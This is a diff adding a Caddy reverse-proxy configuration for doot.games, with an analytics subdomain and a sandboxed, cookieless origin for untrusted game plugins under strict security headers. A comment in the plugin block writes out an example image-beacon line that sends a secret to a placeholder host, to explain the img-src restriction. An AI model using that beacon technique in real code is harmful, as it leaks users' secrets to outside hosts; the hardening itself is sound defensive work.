@@ -1,0 +1,53 @@
+# Caddy reverse proxy with automatic HTTPS. Replace doot.games with your domain.
+# Caddy provisions and renews TLS certificates on its own.
+
+doot.games {
+	encode zstd gzip
+	reverse_proxy app:3000
+}
+
+# Privacy-friendly analytics (self-hosted GoatCounter). Both the login dashboard
+# and the count.js tracking endpoint live here; the tracking script on doot.games
+# points at this origin (set GOATCOUNTER_URL=https://stats.doot.games in the app
+# env to switch it on). A separate subdomain keeps it off the app origin, like
+# plugins.doot.games. The Host header reaches GoatCounter unchanged, so it must
+# match the site's vhost you create (stats.doot.games). Self-hosters: use a
+# `stats.` subdomain of your own domain and point GOATCOUNTER_URL at it.
+stats.doot.games {
+	encode zstd gzip
+	reverse_proxy goatcounter:8080
+}
+
+# Untrusted-plugin origin. A deliberately SEPARATE ORIGIN from doot.games so a
+# sandboxed plugin lands on a cookieless, session-less host (the Sandpack/itch.io
+# lesson; see docs/external-plugins.md + docs/plugin-authoring-roadmap.md). This
+# is safe as a subdomain only because Doot's auth cookies are host-only - never
+# set a `.doot.games` cookie or enable better-auth crossSubDomainCookies.
+#
+# It is static ONLY and MUST NOT reverse_proxy to `app` (which holds the session,
+# DB, and relay). Today it serves a locked-down placeholder so the origin + cert +
+# CSP go live; Phase 1 swaps `respond` for `file_server` over the built plugin
+# host shell + bridge. Self-hosters: use a `plugins.` subdomain of your own
+# domain (or a separate domain) and keep these headers.
+plugins.doot.games {
+	encode zstd gzip
+	header {
+		# connect-src 'none' blocks fetch/XHR/WebSocket. But it is NOT "can't
+		# exfiltrate" on its own: any allowed remote img-src is a beacon channel
+		# (new Image().src = 'https://host/?d=' + secret). So img-src is 'self'
+		# + data: only - platform media is handed to the plugin over the bridge,
+		# never as a fetchable URL the plugin builds. frame-ancestors lets only
+		# Doot embed it. Reviewed plugins may later widen connect-src per manifest.
+		Content-Security-Policy "default-src 'none'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'none'; frame-ancestors https://doot.games; base-uri 'none'; form-action 'none'"
+		# Deny powerful features as defense-in-depth (the sandbox already blocks
+		# most; this is cheap and explicit). Not X-Frame-Options: it can't allow a
+		# cross-origin ancestor, and frame-ancestors above is the correct control.
+		Permissions-Policy "camera=(), microphone=(), geolocation=(), payment=(), usb=(), serial=(), bluetooth=(), hid=(), midi=(), accelerometer=(), gyroscope=(), magnetometer=()"
+		X-Content-Type-Options "nosniff"
+		Cross-Origin-Opener-Policy "same-origin"
+		Cross-Origin-Resource-Policy "same-site"
+		Referrer-Policy "no-referrer"
+		-Server
+	}
+	respond "Doot plugin origin - untrusted game plugins run sandboxed here. See https://doot.games" 200
+}
